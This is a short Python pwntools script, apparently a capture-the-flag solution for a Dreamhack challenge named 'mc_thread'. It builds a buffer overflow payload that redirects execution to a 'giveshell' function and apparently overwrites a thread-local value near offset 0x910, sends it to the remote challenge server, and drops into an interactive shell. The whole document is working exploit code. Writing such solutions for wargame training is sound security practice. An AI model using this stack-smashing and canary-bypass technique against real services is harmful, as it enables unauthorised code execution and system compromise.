# !/bin/usr/python3

from pwn import *

#p = process('./mc_thread')
p = remote('host3.dreamhack.games', 11981)
e = ELF('./mc_thread')

payload = b'A' * 0x108
payload += b'A' * 0x8
payload += b'B' *0x8
payload += p64(e.symbols['giveshell'])
payload += b'A' *(0x910 - len(payload))
payload += p64(0x404800 - 0x972)
payload += b'C' *0x10
payload += b'A' *0x8
payload += b'AAAAAAAA' * 75

inp_sz = len(payload)
p.sendlineafter(b'Size: ', str(inp_sz).encode())
p.sendafter(b'Data: ', payload)

p.interactive()
